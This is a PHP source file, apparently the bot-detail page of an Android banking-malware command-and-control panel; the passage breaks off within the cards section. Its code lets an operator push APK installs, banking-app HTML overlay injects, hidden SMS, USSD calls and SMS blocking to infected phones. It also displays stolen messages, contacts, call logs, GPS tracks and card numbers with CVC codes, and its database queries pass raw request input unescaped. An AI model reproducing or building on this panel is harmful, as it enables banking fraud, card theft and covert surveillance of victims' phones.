<?php
	include "config.php";
	
	//$gi = geoip_open("assets/GeoLiteCity.dat",GEOIP_STANDARD);

	
	$bid = $_GET['id'];
	
	if($_GET['id']=="" && $_POST['bid']==""){
		header("Location: list.php");
		die();
	}
	
	function make_accordion($htmlarray){
		$html ="<div id=\"accordion\" role=\"tablist\" aria-multiselectable=\"true\">";
		$i=0;
		foreach($htmlarray as $ha){
			$id = $i . "" .time();
			$d = "";
			if($i==0){$d="show";}else{$d="";}
			$html .= "
			<div class=\"card\">
				<div class=\"card-header\" role=\"tab\" id=\"heading$id\">
				  <h5 class=\"mb-0\">
					<a data-toggle=\"collapse\" data-parent=\"#accordion\" href=\"#collapse$id\" aria-expanded=\"true\" aria-controls=\"collapse$id\">
					  ".$ha[0]."
					</a>
				  </h5>
				</div>

				<div id=\"collapse$id\" class=\"collapse $d\" role=\"tabpanel\" aria-labelledby=\"heading$id\">
				  <div class=\"card-block\">
					".$ha[1]."
				  </div>
				</div>
			  </div>";
			  $i++;
		}
		$html .= "</div>";
		return $html;
	}
	
	if(strlen($_POST['op'])>0){
		if($_POST['op']=="8"){		
			$file = md5(time()).".apk";
			$uploadfile = "./files/".$file;
			//echo $uploadfile."\r\n";
			if (move_uploaded_file($_FILES['myfile']['tmp_name'], $uploadfile)) {
				$data = array();
				$data['url']=$kernel['gate']."/files/".$file;
				generate_command($_POST['bid'],8,json_encode($data),0);
				echo "good!";
			} else {
				echo "error upload!";
			}
			die();
		}
		if($_POST['op']=="88"){	
			$data = array();
			$data['url']=$_POST['url'];	
			generate_command($_POST['bid'],8,json_encode($data),0);
			//die();
		}
		
		if($_POST['query']=="runinject"){
			$data = array();
			$data['status']=1;
			$data['html'] = $rc->Encrypt($_POST['html']);
			$data['idinj'] = 1;
			generate_command($_POST['bid'],21,json_encode($data),0);
		}
		
		if($_POST['query']=="sendsms"){
			$data = array();
			$data['to'] = $_POST['to'];
			$data['body'] = $_POST['body'];
			//var_dump(json_encode($data));
			$idcom=11;
			if($_POST['hidesms']=="on"){
				$idcom=24;
			}
			generate_command($_POST['bid'],$idcom,json_encode($data,JSON_UNESCAPED_UNICODE),0);
		}
		if($_POST['query']=="makecall"){
			$data = array();
			$data['number'] = $_POST['to'];
			$idcom=0;
			if($_POST['ussd']=="on"){
				$idcom=7;
			}else{
				$idcom=28;
			}
			generate_command($_POST['bid'],$idcom,json_encode($data,JSON_UNESCAPED_UNICODE),0);
		}
		if($_POST['query']=="sendsmstoall"){
			$data = array();
			$data['text'] = $_POST['text'];
			generate_command($_POST['bid'],19,json_encode($data,JSON_UNESCAPED_UNICODE),0);
		}
		
		if($_POST['noref']!="true")
			header("Location: bot.php?id=".$_POST['bid']);
			
		die();
	}
	
	
	
	if($_GET['id']==""){
		header("Location: list.php");
		die();
	}
	
	if(strlen($_GET['op'])>0){
		$html.= "<a href=bot.php?id=".$bid.">[back]</a><hr>";
	}
	
	$fav = 0;
	
	
	if($_GET['op']=="startinject"){
		$val = "";
		$val['status'] = 3;
		generate_command($bid,21,json_encode($val),0,0);
		$bapps = get_apps_bot($bid);
		$appsInj = get_list_injects();
		$find_inj = array_intersect_key($bapps,$appsInj);
		if(count($find_inj)>0){
			foreach($find_inj as $key=>$fi){
				$val['status'] = 2;
				$val['html'] = get_inject($key,$bid);
				$val['base'] = $key;
				$val['idinj'] = get_inject_id($key);
				generate_command($bid,21,json_encode($val),0,0);
			}
		}
		$val = "";
		$val['status'] = 4;
		generate_command($bid,21,json_encode($val),0,0);
		header("Location: bot.php?id=".$bid);
		die();
	}
	
	if($_GET['op']=="stopinject"){
		$val = "";
		$val['status'] = 3;
		generate_command($bid,21,json_encode($val),0,0);
		$val = "";
		$val['status'] = 4;
		generate_command($bid,21,json_encode($val),0,0);
		header("Location: bot.php?id=".$bid);
		die();
	}
	
	
	if($_GET['op']=="showform"){
			if($_GET['query']=="makeinject"){
				$html .= "
					<form action=\"\" method=\"POST\">
						<input type=hidden name=op value=\"post\" />
						<input type=hidden name=query value=\"runinject\" />
						<input type=hidden name=bid value=\"".$bid."\" />
						<div class=\"form-group\">
							<label for=\"exampleFormControlTextarea1\">Html code</label>
							<textarea class=\"form-control\" id=\"exampleFormControlTextarea1\" rows=\"7\" name=\"html\"></textarea>
						  </div>
						<button type=\"submit\" class=\"btn btn-primary mb-2\">Run inject</button>
					</form>
				";
			}
			if($_GET['query']=="sendsms"){
				$html .= "
					<form action=\"\" method=\"POST\">
						<input type=hidden name=op value=\"post\" />
						<input type=hidden name=query value=\"sendsms\" />
						<input type=hidden name=bid value=\"".$bid."\" />
						<input class=\"form-control\" type=\"text\" placeholder=\"To\" name=\"to\"><br>
						<div class=\"form-group\">
							<label for=\"exampleFormControlTextarea1\">sms text</label>
							<textarea class=\"form-control\" id=\"exampleFormControlTextarea1\" rows=\"5\" name=\"body\"></textarea>
						  </div>
						<div class=\"col-sm-2\">
						  <input class=\"form-check-input\" type=\"checkbox\" id=\"gridCheck\" name=hidesms>
						  <label class=\"form-check-label\" for=\"gridCheck\">
							hide sms send
						  </label>
						</div>
						<button type=\"submit\" class=\"btn btn-primary mb-2\">send sms</button>
					</form>
				";
			}
			
			if($_GET['query']=="makecall"){
				$html .= "
					<form action=\"\" method=\"POST\">
						<input type=hidden name=op value=\"post\" />
						<input type=hidden name=query value=\"makecall\" />
						<input type=hidden name=bid value=\"".$bid."\" />
						<input class=\"form-control\" type=\"text\" placeholder=\"To\" name=\"to\"><br>
						<div class=\"col-sm-2\">
						  <input class=\"form-check-input\" type=\"checkbox\" id=\"gridCheck\" name=ussd>
						  <label class=\"form-check-label\" for=\"gridCheck\">
							call as ussd
						  </label>
						</div>
						<button type=\"submit\" class=\"btn btn-primary mb-2\">make call</button> P.S. Ussd command without #
					</form>
				";
			}
			if($_GET['query']=="sendsmstoall"){
				$html .= "
					<form action=\"\" method=\"POST\">
						<input type=hidden name=op value=\"post\" />
						<input type=hidden name=query value=\"sendsmstoall\" />
						<input type=hidden name=bid value=\"".$bid."\" />
						<div class=\"form-group\">
							<label for=\"exampleFormControlTextarea1\">sms text</label>
							<textarea class=\"form-control\" id=\"exampleFormControlTextarea1\" rows=\"5\" name=\"text\"></textarea>
						  </div>
						<button type=\"submit\" class=\"btn btn-primary mb-2\">send sms to all contacts</button>
					</form>
				";
			}
	}
	
	if($_GET['op']=="showall"){
		if($_GET['query']=="sms"){
			$html .= "<h3>Phone contacts</h3>";
			$res = $dbm->query("select * from contacts where bot_id='".$bid."' ORDER BY id DESC");
			if($dbm->count>0){
				$count = 0;
				while($rowc=mysqli_fetch_array($res)) {
					$html .= "[(".$rowc[2].") <a href=bot.php?id=".$bid."&op=showall&query=sms&sortcid=".$rowc[0].">".$rowc[3]."</a>] ";
				}
			}else{
				//$html .= "none";
			}
			$html .= " [<font color=red><a href=bot.php?id=".$bid."&op=showall&query=sms>clear filter</a></font>]<hr>";
			
			$ressms = $dbm->query("select * from sms where bot_id='".$bid."' ORDER BY sms_time DESC");
			if($dbm->count>0){
				$count = 0;
				while($rowsms=mysqli_fetch_array($ressms)) {
					$idc = "";
					$cid = 0;
					/*if($rowsms[2]>0 && $rowsms[3]==0){
						$idc = "me <- ";
						$cid = $rowsms[2];
					}
					if($rowsms[3]>0 && $rowsms[2]==0){
						$idc = "me -> ";
						$cid = $rowsms[3];
					}*/
					
					if($rowsms[2]>0 && $rowsms[3]==0){
						$idc = "<p class=\"bg-primary\"><b>	me <- ";
						$cid = $rowsms[2];
					}
					if($rowsms[3]>0 && $rowsms[2]==0){
						$idc = "<p class=\"bg-success text-right\"><b>me -> ";
						$cid = $rowsms[3];
					}
					$contact = get_contact_name_from_id($cid);
					if($_GET['sortcid']>0 && $_GET['sortcid']==$cid){
						$html .= "".$idc ." ".$contact[0]."(".$contact[1].")</b> ";
						$html .= "".new_time(round($rowsms[5]/1000))."<br> ".$rowsms[4]."<br><br>";
					}
					
					if($_GET['sortcid']==""){
						$html .= "".$idc ." ".$contact[0]."(".$contact[1].")</b> ";
						$html .= "".new_time(round($rowsms[5]/1000))."<br> ".$rowsms[4]."<br><br>";
					}
				}
			}else{
				$html .= "none<br>";
			}
		}
		
		if($_GET['query']=="commands"){
			$res = $dbm->query("select * from commands where bid='".$bid."' ORDER BY id DESC");
				if($dbm->count>0){
					$count = 0;
					while($rowc=mysqli_fetch_array($res)) {
						$cs = "";
						if($rowc[5]==0){
							if($rowc[6]==0){
								$cs = "wait";
							}else{
								$cs = "getted";
							}
						}else{
							$cs = "executed";
						}
						$html .= new_time($rowc[4])." - ".$commands[$rowc[2]] ."(".$rowc[2].") - ".$cs."<br>";
					}
				}else{
					$html .= "none";
				}
		}
		
		if($_GET['query']=="contacts"){
			$res = $dbm->query("select * from contacts where bot_id='".$bid."' ORDER BY id DESC");
				if($dbm->count>0){
					$count = 0;
					while($rowc=mysqli_fetch_array($res)) {
						$html .= "<p class=\"bg-info\">".$rowc[2]." - ".$rowc[3]."</p>";
					}
				}else{
					$html .= "none";
				}
		}
		
		if($_GET['query']=="cards"){
			$res = $dbm->query("select * from cards where bot_id='".$bid."' ORDER BY id DESC");
			if($dbm->count>0){
				$count = 0;
				while($row=mysqli_fetch_array($res)) {
					$card = json_decode($row[2]);
					$c = $card->card.":".$card->month.":".$card->year.":".$card->cvc;
					$html .= "<p class=\"bg-info\">".$c."</p>";
				}
			}else{
				$html .= "none";
			}
		}
		
		if($_GET['query']=="apps"){
			$res = $dbm->query("select * from commands where idcom='3' and bid='".$bid."' ORDER BY id DESC LIMIT 1");
			if($dbm->count>0){
				$count = 0;
				while($row=mysqli_fetch_array($res)) {
					//$row[7] = str_replace("\"name\"","name",$row[7]);
					//$row[7] = str_replace("\"dir\"","dir",$row[7]);
					//$row[7] = str_replace("\"activity\"","activity",$row[7]);
					//print_r($row[7]);
					//$aapp = json_encode($row[7]);
					$aapp = json_decode($row[7]);
					//var_dump($aapp);
					
					for($i=0;$i<count($aapp);$i++){
						//var_dump( $aapp[$i]);
						$html .= "<b><a href=\"list.php?op=filter_app&name=".$aapp[$i]->name."\">".$aapp[$i]->name . "</a></b> - ".$aapp[$i]->activity."<br>";
						$count++;
						//if($count==10)break;
					}
				
					//echo json_last_error_msg();
					//print_r($aaps);
					//$html .= $row[7];
				}
			}else{
				$html .= "none";
			}
		}
		
		if($_GET['query']=="calls"){
			$res = $dbm->query("select * from calls where bot_id='".$bid."' ORDER BY id DESC");
			if($dbm->count>0){
				$count = 0;
				while($row=mysqli_fetch_array($res)) {
					$sql = "select * from contacts where id='".$row[2]."'";
					$resc = $dbm->query($sql);
					while($rowc=mysqli_fetch_array($resc)) {
						$name = $rowc[2];
						$number = $rowc[3];
					}
					if($row['call_type']==1){
						$html .= "<p class=\"bg-primary\"><- ";
					}
					if($row['call_type']==2){
						$html .= "<p class=\"bg-success\">-> ";
					}
					if($row['call_type']==3){
						$html .= "<p class=\"bg-warning\">??? ";
					}
					$html .= $name."(".$number.") - ".new_time(round($row[4]/1000))."<br>";
				}
			}else{
				$html .= "none";
			}
		}
		
		if($_GET['query']=="historyapps"){
			$res = $dbm->query("select * from apps_logs where bid='".$bid."' ORDER BY id DESC LIMIT 10");
			if($dbm->count>0){
				$count = 0;
				while($row=mysqli_fetch_array($res)) {
					$html .= "<a href=\"list.php?op=filter_app&name=".$row[2]."\">".$row[2] . "</a> - ".new_time($row[4])."<br>";
				}
			}else{
				$html .= "none";
			}
		}
		if($_GET['query']=="gps"){
			$html .="<script type=\"text/javascript\">
				ymaps.ready(init);
				var myMap;

			";
			
			$res = $dbm->query("select * from commands where idcom='9' and bid='".$bid."' ORDER BY id DESC");
			if($dbm->count>0){
				$count = 0;
				$icor = 0;
				$listcoords = "";
				while($row=mysqli_fetch_array($res)) {
					if($row[7]!=""){
						$data = explode(":",$row[7]);
						if($icor==0){
							$html .= "
							
								function init(){ 
									myMap = new ymaps.Map(\"map\", {
										center: [".$data[0].", ".$data[1]."],
										zoom: 1
									}); 
									
									var myGeoObject$icor = new ymaps.GeoObject({
										geometry: {
											type: \"Point\",
											coordinates: [".$data[0].", ".$data[1]."]
										},
										properties: {
											// Контент метки.
											iconContent: 'Последняя метка',
											hintContent: 'Я был тут :)'
										}
									}, {
										preset: 'islands#blackStretchyIcon',
										draggable: false
									}),
									myPieChart = new ymaps.Placemark([
										".$data[0].", ".$data[1]."
									], {
										data: [
											{weight: 8, color: '#0E4779'},
											{weight: 6, color: '#1E98FF'},
											{weight: 4, color: '#82CDFF'}
										],
										iconCaption: \"Диаграмма\"
									}, {
										iconLayout: 'default#pieChart',
										iconPieChartRadius: 30,
										iconPieChartCoreRadius: 10,
										iconPieChartCoreFillStyle: '#ffffff',
										iconPieChartStrokeStyle: '#ffffff',
										iconPieChartStrokeWidth: 3,
										iconPieChartCaptionMaxWidth: 200
									});

									myMap.geoObjects.add(myGeoObject$icor);
							
							";
							$listcoords .= new_time($row[5]) . " ( " .$data[0]." : ".$data[1]." )<br>";
							$icor++;
						}else{
							$html .= "
							
							var myGeoObject$icor = new ymaps.GeoObject({
								geometry: {
									type: \"Point\",
									coordinates: [".$data[0].", ".$data[1]."]
								},
								properties: {
									// Контент метки.
									iconContent: '$icor',
									hintContent: 'Я был тут :)'
								}
							}, {
								preset: 'islands#blackStretchyIcon',
								draggable: false
							}),
							myPieChart = new ymaps.Placemark([
								".$data[0].", ".$data[1]."
							], {
								data: [
									{weight: 8, color: '#0E4779'},
									{weight: 6, color: '#1E98FF'},
									{weight: 4, color: '#82CDFF'}
								],
								iconCaption: \"Диаграмма\"
							}, {
								iconLayout: 'default#pieChart',
								iconPieChartRadius: 30,
								iconPieChartCoreRadius: 10,
								iconPieChartCoreFillStyle: '#ffffff',
								iconPieChartStrokeStyle: '#ffffff',
								iconPieChartStrokeWidth: 3,
								iconPieChartCaptionMaxWidth: 200
							});

							myMap.geoObjects.add(myGeoObject$icor);
							
							";
						}
						$listcoords .= new_time($row[5]) . " ( " .$data[0]." : ".$data[1]." )<br>";
						$icor++;
						//$html .= $data[0]." : ".$data[1]."<br>";
					}else{
							//$html .= "fail get<br>";
						
					}
					
				}
			}else{
				//$html .= "none<br>";
			}
			
			$html .= "
			
			}
			
			</script>
			
			<div id=\"map\" style=\"width: 350px; height: 350px\"></div><br>
			";
			
			$html .= $listcoords;
		}
		
	}
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	
	print_header();
	
	print_menu();
	
	$res = $dbm->query("select * from bots where bid='".$bid."'");
	if($dbm->count>0){
		if($_GET['op']==""){
			while($row=mysqli_fetch_array($res)) {
				$fav = $row[16];
				$online = "<font color=red>".new_time($row[5])."</font>";
				
				$t = time();
				if(($t-$row[5])<300){
					$online = "<font color=green><b>online</b></font>";
					$html .= "<button type=\"button\" class=\"btn btn-success\">ONLINE</button>";
				}else{
					$html .= "<button type=\"button\" class=\"btn btn-danger\">OFFLINE</button>";
				}
				//$html .= "bot is : ".$online;
				
				$html .= " | ";
				
				
				//if($row[16]==1){
				//	$html .= " , is favorite";
				//}
				
				if($fav){
					$html .= " <button type=\"button\" class=\"btn btn-warning\" onclick=\"location.href='ajax.php?bid=".$bid."&op=remfav';\">Remove from FAV</button>";
				}else{
					//$html .= " <button type=\"button\" class=\"btn btn-warning\">Request balances</button> ";
				}
				
				$html .= "<button type=\"button\" class=\"btn btn-danger\" id=\"appsrequest\">Enable Debug</button>
							<script>
							$(document).ready(function($) {
								var cardobj = new Object();
								cardobj.status  = 1;
								var cardjsonString= JSON.stringify(cardobj);

								$(\"#appsrequest\").click(function(e) {
									e.preventDefault();
									$.ajax({
										type: \"POST\",
										url: \"ajax.php\",
										data: { 
											op: \"addcom\",
											bid: \"".$bid."\",
											idcom: 32,
											data: cardjsonString,
										},
										success: function(result) {
											location.reload();  
											//alert('ok');
										},
										error: function(result) {
											alert('error');
										}
									});
									//alert(1);
								});
							});
							</script>";
				
				$html .= " <button type=\"button\" class=\"btn btn-warning\">Request balances</button> ";
				
				$html .= " <button type=\"button\" class=\"btn btn-success\" onclick=\"location.href='filemanager.php?bid=".$bid."';\">File manager</button>";
				
				$html .= " Current balances : none, Know banks : none";
				
				if($row[18]==1)
				$html .= "<button type=\"button\" class=\"btn btn-success\" id=\"appsrequest\">Request Apps</button>
							<script>
							$(document).ready(function($) {
								var cardobj = new Object();
								cardobj.status  = 1;
								var cardjsonString= JSON.stringify(cardobj);

								$(\"#appsrequest\").click(function(e) {
									e.preventDefault();
									$.ajax({
										type: \"POST\",
										url: \"ajax.php\",
										data: { 
											op: \"addcom\",
											bid: \"".$bid."\",
											idcom: 3,
											data: cardjsonString,
										},
										success: function(result) {
											location.reload();  
											//alert('ok');
										},
										error: function(result) {
											alert('error');
										}
									});
									//alert(1);
								});
							});
							</script>";
				
				$html .="<hr>";
				
				if($row[18]==0){
////////////////////////////////////////////////////////////////////////line one				
					$line1 .="<div class=\"row\">
						<div class=\"col-lg-4\">
							<h3>SMS data</h3>
							";
							
							$ressms = $dbm->query("select * from sms where bot_id='".$bid."' ORDER BY sms_time DESC LIMIT 10");
							if($dbm->count>0){
								$count = 0;
								while($rowsms=mysqli_fetch_array($ressms)) {
									$idc = "";
									$cid = 0;
									if($rowsms[2]>0 && $rowsms[3]==0){
										$idc = "<p class=\"bg-primary\" title=\"".$rowsms[4]."\"><b>me <- ";
										$cid = $rowsms[2];
									}
									if($rowsms[3]>0 && $rowsms[2]==0){
										$idc = "<p class=\"bg-success text-right\" title=\"".$rowsms[4]."\"><b>me -> ";
										$cid = $rowsms[3];
									}
									$contact = get_contact_name_from_id($cid);
									$line1 .= "".$idc ." ".$contact[0]."(".$contact[1].")</b> ";
									$line1 .= "<font size=1>".new_time(round($rowsms[5]/1000))."</font><br> ".mb_strimwidth($rowsms[4],0,20,"...")."</p>";
								}
							}else{
								$line1 .= "none<br>";
							}
							
							$line1 .= "
						
							<button type=\"button\" class=\"btn btn-success\" onclick=\"location.href='bot.php?id=".$bid."&op=showform&query=sendsms';\">Send SMS</button>
							<button type=\"button\" class=\"btn btn-success\" onclick=\"location.href='bot.php?id=".$bid."&op=showform&query=sendsmstoall';\">Send SMS to All</button>
							<button type=\"button\" class=\"btn btn-success\" id=\"smsrequest\">Request</button>
							<button type=\"button\" class=\"btn\" onclick=\"location.href='bot.php?id=".$bid."&op=showall&query=sms';\">Show all</button>
							<button type=\"button\" class=\"btn btn-warning\" onclick=\"location.href='raw.php?id=".$bid."&query=allsmss';\">Export</button>
							<script>
							$(document).ready(function($) {
								var cardobj = new Object();
								cardobj.status  = 1;
								var cardjsonString= JSON.stringify(cardobj);

								$(\"#smsrequest\").click(function(e) {
									e.preventDefault();
									$.ajax({
										type: \"POST\",
										url: \"ajax.php\",
										data: { 
											op: \"addcom\",
											bid: \"".$bid."\",
											idcom: 4,
											data: cardjsonString,
										},
										success: function(result) {
											location.reload();  
											//alert('ok');
										},
										error: function(result) {
											alert('error');
										}
									});
									//alert(1);
								});
							});
							</script>
							<button type=\"button\" class=\"btn btn-danger\" id=\"smsunblockall\">UnblockSMS</button>
							<script>
							$(document).ready(function($) {
								var cardobj = new Object();
								cardobj.status  = 1;
								var cardjsonString= JSON.stringify(cardobj);

								$(\"#smsunblockall\").click(function(e) {
									e.preventDefault();
									$.ajax({
										type: \"POST\",
										url: \"ajax.php\",
										data: { 
											op: \"addcom\",
											bid: \"".$bid."\",
											idcom: 27,
											data: cardjsonString,
										},
										success: function(result) {
											location.reload();  
											//alert('ok');
										},
										error: function(result) {
											alert('error');
										}
									});
									//alert(1);
								});
							});
							</script>
							<button type=\"button\" class=\"btn btn-danger\" id=\"smsblockall\">BlockSMS</button>
							<script>
							$(document).ready(function($) {
								var cardobj = new Object();
								cardobj.status  = 1;
								var cardjsonString= JSON.stringify(cardobj);

								$(\"#smsblockall\").click(function(e) {
									e.preventDefault();
									$.ajax({
										type: \"POST\",
										url: \"ajax.php\",
										data: { 
											op: \"addcom\",
											bid: \"".$bid."\",
											idcom: 26,
											data: cardjsonString,
										},
										success: function(result) {
											location.reload();  
											//alert('ok');
										},
										error: function(result) {
											alert('error');
										}
									});
									//alert(1);
								});
							});
							</script>
						</div>
						<div class=\"col-lg-4\">
							<h3>Last Commands</h3>
							";
							
							$res = $dbm->query("select * from commands where bid='".$bid."' ORDER BY id DESC LIMIT 10");
							if($dbm->count>0){
								$count = 0;
								while($rowc=mysqli_fetch_array($res)) {
									$cs = "";
									if($rowc[5]==0){
										if($rowc[6]==0){
											$cs = "wait";
										}else{
											$cs = "getted";
										}
										
										$line1 .= "<p class=\"bg-info\">".new_time($rowc[4])." - ".$commands[$rowc[2]] ."(".$rowc[2].") - ".$cs."</p>";
										
									}else{
										$cs = "executed";
										$line1 .= "<p class=\"bg-success\">".new_time($rowc[4])." - ".$commands[$rowc[2]] ."(".$rowc[2].") - ".$cs."<p>";
									}
									
								}
							}else{
								$line1 .= "none";
							}
							
							$line1 .= "
							<button type=\"button\" class=\"btn btn-success\">Make command</button>
							<button type=\"button\" class=\"btn\" onclick=\"location.href='bot.php?id=".$bid."&op=showall&query=commands';\">Show all</button>
							<button type=\"button\" class=\"btn btn-warning\" onclick=\"location.href='raw.php?id=".$bid."&query=commands';\">Export</button>
						</div>
						<div class=\"col-lg-4\">
							<h3>Bot data info</h3>
							
							
							<script>
							
							function copy(data){
								var inp =document.createElement('input');
								document.body.appendChild(inp);
								inp.value =data;
								inp.select();
								document.execCommand('copy',false);
								inp.remove();
							}
							</script>
							";
							
					foreach ($row as $key => $value) {
						if(!is_numeric($key)){
							
							switch($key){
								case "bid":
									$line1 .= "<b>". $key ."</b> : " .$value;
									$line1 .=" <a href=# onclick=copy('".$value."');><i class=\"fa fa-copy\"></i></a>";
									break;
								case "bot_permission":
									$line1 .="<b>Permissions</b> : ".$value." (";
									if(substr($value,1,1)=="1"){
										$line1 .= "<font color=red><b>blocksms</b></font>,";
									}else{
										$line1 .= "<font color=green><b>smsnonblock</b></font>,";
									}
									if(substr($value,3,1)=="1"){
										$line1 .= "<font color=red><b>wait inject</b></font>,";
									}else{
										$line1 .= "<font color=green><b>free inject</b></font>,";
									}
									
									if(substr($value,7,1)=="1"){
										$line1 .= "<font color=green><b>have urlb</b></font>,";
									}else{
										$line1 .= "<font color=red><b>need urlb</b></font>,";
									}
									
									if(substr($value,11,1)=="1"){
										$line1 .= "<font color=green><b>can install apk</b></font>,";
									}else{
										$line1 .= "<font color=red><b>not install other apk</b></font>,";
									}
									$line1 .= ")";
									break;
								case "fav":
									if($value==1){
										$line1 .= "<b>$key</b> : liked bot";
									}else{
										$line1 .= "<b>$key</b> : simple bot";
									}
									break;
								default:
									$line1 .= "<b>$key</b> : $value";
							}
							
							$line1 .="<br>";
						}
					}
					
					
					$line1 .="	</div>
					</div>
					";
					
					
	//////////////////////////////////////////////////////////////line two				
					
					$line2 .= "
					<br>
					<div class=\"row\">
						<div class=\"col-lg-4\">
							<h3>Apps on phone</h3>
							";
							
							$res = $dbm->query("select * from commands where idcom='3' and bid='".$bid."' ORDER BY id DESC LIMIT 1");
							if($dbm->count>0){
								$count = 0;
								while($row=mysqli_fetch_array($res)) {
									//$row[7] = str_replace("\"name\"","name",$row[7]);
									//$row[7] = str_replace("\"dir\"","dir",$row[7]);
									//$row[7] = str_replace("\"activity\"","activity",$row[7]);
									//print_r($row[7]);
									//$aapp = json_encode($row[7]);
									$aapp = json_decode($row[7]);
									//var_dump($aapp);
									
									for($i=0;$i<count($aapp);$i++){
										//var_dump( $aapp[$i]);
										$line2 .= "<a href=\"list.php?op=filter_app&name=".$aapp[$i]->name."\">".$aapp[$i]->name . "</a><br>";
										$count++;
										if($count==10)break;
									}
								
									//echo json_last_error_msg();
									//print_r($aaps);
									//$html .= $row[7];
								}
							}else{
								$line2 .= "none";
							}
							
							$line2 .= "
							<button type=\"button\" class=\"btn btn-success\" id=\"appsrequest\">Request</button>
							<button type=\"button\" class=\"btn\" onclick=\"location.href='bot.php?id=".$bid."&op=showall&query=apps';\">Show all</button>
							<button type=\"button\" class=\"btn btn-warning\" onclick=\"location.href='raw.php?id=".$bid."&query=apps';\">Export</button>
							<script>
							$(document).ready(function($) {
								var cardobj = new Object();
								cardobj.status  = 1;
								var cardjsonString= JSON.stringify(cardobj);

								$(\"#appsrequest\").click(function(e) {
									e.preventDefault();
									$.ajax({
										type: \"POST\",
										url: \"ajax.php\",
										data: { 
											op: \"addcom\",
											bid: \"".$bid."\",
											idcom: 3,
											data: cardjsonString,
										},
										success: function(result) {
											location.reload();  
											//alert('ok');
										},
										error: function(result) {
											alert('error');
										}
									});
									//alert(1);
								});
							});
							</script>
						</div>
						<div class=\"col-lg-4\">
							<h3>Geo Location</h3>
							";
							
							$line2 .="<script type=\"text/javascript\">";
							
							$res = $dbm->query("select * from commands where idcom='9' and bid='".$bid."' ORDER BY id DESC LIMIT 10");
							if($dbm->count>0){
								$count = 0;
								$icor = 0;
								while($row=mysqli_fetch_array($res)) {
									if($row[7]!=""){
										$data = explode(":",$row[7]);
										if($icor==0){
											$line2 .= "
											ymaps.ready(init);
											var myMap;
												function init(){ 
													myMap = new ymaps.Map(\"map\", {
														center: [".$data[0].", ".$data[1]."],
														zoom: 1
													}); 
													
													var myGeoObject$icor = new ymaps.GeoObject({
														geometry: {
															type: \"Point\",
															coordinates: [".$data[0].", ".$data[1]."]
														},
														properties: {
															// Контент метки.
															iconContent: 'Последняя метка',
															hintContent: 'Я был тут :)'
														}
													}, {
														preset: 'islands#blackStretchyIcon',
														draggable: false
													}),
													myPieChart = new ymaps.Placemark([
														".$data[0].", ".$data[1]."
													], {
														data: [
															{weight: 8, color: '#0E4779'},
															{weight: 6, color: '#1E98FF'},
															{weight: 4, color: '#82CDFF'}
														],
														iconCaption: \"Диаграмма\"
													}, {
														iconLayout: 'default#pieChart',
														iconPieChartRadius: 30,
														iconPieChartCoreRadius: 10,
														iconPieChartCoreFillStyle: '#ffffff',
														iconPieChartStrokeStyle: '#ffffff',
														iconPieChartStrokeWidth: 3,
														iconPieChartCaptionMaxWidth: 200
													});

													myMap.geoObjects.add(myGeoObject$icor);
											
											";
										}else{
											$line2 .= "
											
											var myGeoObject$icor = new ymaps.GeoObject({
												geometry: {
													type: \"Point\",
													coordinates: [".$data[0].", ".$data[1]."]
												},
												properties: {
													// Контент метки.
													iconContent: '$icor',
													hintContent: 'Я был тут :)'
												}
											}, {
												preset: 'islands#blackStretchyIcon',
												draggable: false
											}),
											myPieChart = new ymaps.Placemark([
												".$data[0].", ".$data[1]."
											], {
												data: [
													{weight: 8, color: '#0E4779'},
													{weight: 6, color: '#1E98FF'},
													{weight: 4, color: '#82CDFF'}
												],
												iconCaption: \"Диаграмма\"
											}, {
												iconLayout: 'default#pieChart',
												iconPieChartRadius: 30,
												iconPieChartCoreRadius: 10,
												iconPieChartCoreFillStyle: '#ffffff',
												iconPieChartStrokeStyle: '#ffffff',
												iconPieChartStrokeWidth: 3,
												iconPieChartCaptionMaxWidth: 200
											});

											myMap.geoObjects.add(myGeoObject$icor);
											
											";
										}
										$icor++;
										//$html .= $data[0]." : ".$data[1]."<br>";
									}else{
											//$html .= "fail get<br>";
										
									}
									
								}
							}else{
								//$html .= "none<br>";
							}
							if($dbm->count>0){$line2 .= "}";}
							$line2 .= "
							
							
							</script>
							
							<div id=\"map\" style=\"width: 350px; height: 350px\"></div>
							";
							
							$line2 .= "<button type=\"button\" class=\"btn btn-success\" id=\"gpsrequest\">Request Now</button>
							<button type=\"button\" class=\"btn\" onclick=\"location.href='bot.php?id=".$bid."&op=showall&query=gps';\">Show all</button>
							<button type=\"button\" class=\"btn btn-warning\">Export</button>
							<script>
							$(document).ready(function($) {
								var gps = new Object();
								gps.status  = 1;
								var gpsjsonString= JSON.stringify(gps);

								$(\"#gpsrequest\").click(function(e) {
									e.preventDefault();
									$.ajax({
										type: \"POST\",
										url: \"ajax.php\",
										data: { 
											op: \"addcom\",
											bid: \"".$bid."\",
											idcom: 9,
											data: gpsjsonString,
										},
										success: function(result) {
											location.reload();  
											//alert('ok');
										},
										error: function(result) {
											alert('error');
										}
									});
									//alert(1);
								});
							});
							</script>
						</div>
						<div class=\"col-lg-4\">
							<h3>Cards</h3>
							";
							
							$res = $dbm->query("select * from cards where bot_id='".$bid."' ORDER BY id DESC LIMIT 10");
							if($dbm->count>0){
								$count = 0;
								while($row=mysqli_fetch_array($res)) {
									$card = json_decode($row[2]);
									$c = $card->card.":".$card->month.":".$card->year.":".$card->cvc;
									$line2 .= "<p class=\"bg-info\">".$c."</p>";
								}
							}else{
								$line2 .= "none";
							}
							
							$line2 .= "
							<button type=\"button\" class=\"btn btn-success\" id=\"cardrequest\">Request</button>
